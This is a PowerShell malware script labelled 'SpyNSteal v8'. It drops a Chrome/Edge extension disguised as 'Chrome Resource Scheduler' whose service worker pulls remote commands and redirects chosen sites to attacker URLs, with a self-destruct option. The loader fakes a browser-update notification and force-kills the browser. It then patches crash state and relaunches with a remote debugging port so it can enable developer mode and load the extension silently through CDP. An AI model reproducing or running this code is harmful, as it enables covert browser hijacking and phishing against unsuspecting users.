# SpyNSteal v8 - CDP extension loading with diagnostics

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

function Test-Port([int]$port) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $ar = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
        $ok = $ar.AsyncWaitHandle.WaitOne(1500)
        if ($ok) { try { $tcp.EndConnect($ar) } catch { $ok = $false } }
        $tcp.Close()
        return $ok
    } catch { return $false }
}

function Http-Get([string]$url, [int]$timeoutMs = 3000) {
    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Timeout = $timeoutMs
        $req.ReadWriteTimeout = $timeoutMs
        $resp = $req.GetResponse()
        $sr = New-Object IO.StreamReader($resp.GetResponseStream())
        $body = $sr.ReadToEnd()
        $sr.Close(); $resp.Close()
        return $body
    } catch { return $null }
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Send-WS($ws, [string]$text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $seg = New-Object System.ArraySegment[byte]($bytes, 0, $bytes.Length)
    $task = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
    if (-not $task.Wait(10000)) { return $false }
    return $true
}

function Recv-WS($ws, [int]$timeoutMs = 10000) {
    $buf = New-Object byte[] 131072
    $all = New-Object System.Collections.Generic.List[byte]
    $deadline = [DateTime]::Now.AddMilliseconds($timeoutMs)
    do {
        $seg = New-Object System.ArraySegment[byte]($buf, 0, $buf.Length)
        $task = $ws.ReceiveAsync($seg, [System.Threading.CancellationToken]::None)
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { return $null }
        if (-not $task.Wait($remaining)) { return $null }
        for ($i = 0; $i -lt $task.Result.Count; $i++) { $all.Add($buf[$i]) }
    } while (-not $task.Result.EndOfMessage)
    return [Text.Encoding]::UTF8.GetString($all.ToArray())
}

function Invoke-CDP($ws, [int]$id, [string]$method, $params) {
    $cmd = @{ id = $id; method = $method }
    if ($params) { $cmd.params = $params }
    $json = $cmd | ConvertTo-Json -Depth 10 -Compress
    if (-not (Send-WS $ws $json)) { return $null }
    $deadline = [DateTime]::Now.AddSeconds(15)
    while ([DateTime]::Now -lt $deadline) {
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { break }
        $text = Recv-WS $ws $remaining
        if (-not $text) { break }
        try {
            $obj = $text | ConvertFrom-Json
            if ($obj.PSObject.Properties["id"] -and $obj.id -eq $id) { return $obj }
        } catch {}
    }
    return $null
}

function Launch-WithDebugPort([string]$browserExe, [int]$port, [string]$extraArgs) {
    $argStr = "--remote-debugging-port=$port --remote-allow-origins=*"
    if ($extraArgs) { $argStr += " $extraArgs" }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $browserExe
    $psi.Arguments = $argStr
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Log "Launched: $browserExe $argStr"
}

function Wait-ForDebugPort([int]$port, [int]$maxSeconds = 15) {
    for ($i = 0; $i -lt $maxSeconds; $i++) {
        Start-Sleep 1
        if (Test-Port $port) {
            Log "Port $port is OPEN (attempt $i)"
            $ver = Http-Get "http://127.0.0.1:$port/json/version" 2000
            if ($ver) {
                Log "Debug endpoint responding"
                return $true
            }
            Log "Port open but HTTP not responding yet"
        }
    }
    Log "Port $port never opened after ${maxSeconds}s"
    return $false
}

function CDP-LoadExtension([int]$port, [string]$extDir) {
    $debugUrl = "http://127.0.0.1:$port"

    # Create chrome://extensions tab
    $tabJson = Http-Get "$debugUrl/json/new?chrome://extensions" 5000
    if (-not $tabJson) {
        Log "Failed to create extensions tab"
        return $false
    }
    $tabInfo = $tabJson | ConvertFrom-Json
    $wsUrl = $tabInfo.webSocketDebuggerUrl
    if (-not $wsUrl) { Log "No WS URL"; return $false }
    Log "Tab WS: $wsUrl"

    Start-Sleep 4

    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    try {
        $task = $ws.ConnectAsync([Uri]$wsUrl, [System.Threading.CancellationToken]::None)
        if (-not $task.Wait(10000)) { Log "WS timeout"; return $false }
    } catch { Log "WS error: $_"; return $false }
    Log "WS connected"

    # Wait for API
    $apiOk = $false
    for ($t = 0; $t -lt 8; $t++) {
        $r = Invoke-CDP $ws (10+$t) "Runtime.evaluate" @{
            expression = "(typeof chrome !== 'undefined' && typeof chrome.developerPrivate !== 'undefined').toString()"
            returnByValue = $true
        }
        $v = ""; if ($r -and $r.result -and $r.result.result) { $v = $r.result.result.value }
        Log "API check $t : $v"
        if ($v -eq "true") { $apiOk = $true; break }
        Start-Sleep 2
    }
    if (-not $apiOk) { Log "API unavailable"; try{$ws.Dispose()}catch{}; return $false }

    # Enable dev mode
    $dr = Invoke-CDP $ws 20 "Runtime.evaluate" @{
        expression = "new Promise(function(r){chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true},function(){r('ok')});})"
        awaitPromise = $true; returnByValue = $true
    }
    $dv = ""; if ($dr -and $dr.result -and $dr.result.result) { $dv = $dr.result.result.value }
    Log "Dev mode: $dv"

    Start-Sleep 1

    # Load extension
    $ep = $extDir.Replace('\','/')
    $expr = "new Promise(function(resolve,reject){try{chrome.developerPrivate.loadUnpacked({path:'$ep'},function(r){if(chrome.runtime.lastError){reject(new Error(chrome.runtime.lastError.message));}else{resolve(r?JSON.stringify(r):'loaded');}});}catch(e){reject(e);}})"

    $lr = Invoke-CDP $ws 30 "Runtime.evaluate" @{
        expression = $expr
        awaitPromise = $true; returnByValue = $true
    }
    $lv = ""; $le = ""
    if ($lr) {
        if ($lr.result -and $lr.result.result) { $lv = "$($lr.result.result.value)" }
        if ($lr.result -and $lr.result.exceptionDetails) {
            $ex = $lr.result.exceptionDetails
            $le = if ($ex.exception -and $ex.exception.description) { $ex.exception.description } else { $ex.text }
        }
    }
    Log "Load: $lv"
    if ($le) { Log "Load error: $le" }

    try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"", [System.Threading.CancellationToken]::None).Wait() } catch {}
    try { $ws.Dispose() } catch {}
    Start-Sleep 1
    Http-Get "$debugUrl/json/close/$($tabInfo.id)" 2000 | Out-Null
    Log "Tab closed"

    return [bool]($lv -and -not $le)
}

# ============================================================================
Log "=== SpyNSteal v8 ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension at: $extDir"

$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

foreach ($b in $browsers) {
    for ($k = 0; $k -lt 20; $k++) {
        if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { break }
        Get-Process $b.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    Log "$($b.Proc) killed: $(-not [bool](Get-Process $b.Proc -EA SilentlyContinue))"
}

foreach ($b in $browsers) { Patch-LocalState $b.UserData }
Start-Sleep 1

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$port = 9222

# Check port is free
if (Test-Port $port) {
    Log "Port $port already in use, trying 9333"
    $port = 9333
}

# ATTEMPT 1: Launch with real profile
Log "=== ATTEMPT 1: Real profile, port $port ==="
Launch-WithDebugPort $target.ExePath $port "--restore-last-session --no-first-run"
$portOk = Wait-ForDebugPort $port 15

if (-not $portOk) {
    Log "Real profile failed. Checking TCP..."
    Log "Port open raw: $(Test-Port $port)"

    # Kill Chrome for attempt 2
    Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 2

    # ATTEMPT 2: Temp profile (diagnostic)
    $port2 = $port + 100
    $tempDir = Join-Path $env:TEMP "cdp_test_$(Get-Random)"
    New-Item $tempDir -ItemType Directory -Force | Out-Null
    Log "=== ATTEMPT 2: Temp profile at $tempDir, port $port2 ==="
    Launch-WithDebugPort $target.ExePath $port2 "--user-data-dir=`"$tempDir`" --no-first-run"
    $portOk2 = Wait-ForDebugPort $port2 15

    if ($portOk2) {
        Log "Temp profile WORKS - real profile has lock/singleton issue"
        # Load extension in temp profile, export the prefs, etc.
        # For now, try loading extension in temp context
        # This won't persist but proves the mechanism works
        $testOk = CDP-LoadExtension $port2 $extDir
        Log "Temp load test: $testOk"

        # Kill temp Chrome
        Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep 2
        Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue

        # ATTEMPT 3: Real profile with explicit --user-data-dir
        $port3 = $port + 200
        Log "=== ATTEMPT 3: Explicit user-data-dir, port $port3 ==="
        Launch-WithDebugPort $target.ExePath $port3 "--user-data-dir=`"$($target.UserData)`" --no-first-run"
        $portOk3 = Wait-ForDebugPort $port3 15

        if ($portOk3) {
            Log "Explicit user-data-dir works!"
            $ok = CDP-LoadExtension $port3 $extDir
            Log "Extension loaded: $ok"
        } else {
            Log "Explicit user-data-dir also failed"
            Log "Port $port3 raw: $(Test-Port $port3)"
        }
    } else {
        Log "Temp profile ALSO failed - Chrome is blocking --remote-debugging-port entirely"
        Log "Port $port2 raw: $(Test-Port $port2)"
        # Kill temp Chrome
        Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep 1
        Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue

        # Relaunch Chrome normally
        Log "Relaunching Chrome normally..."
        Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    }
} else {
    # Port worked with real profile!
    Log "Debug port active with real profile"
    $ok = CDP-LoadExtension $port $extDir
    Log "Extension loaded: $ok"
}

Log "=== Done ==="
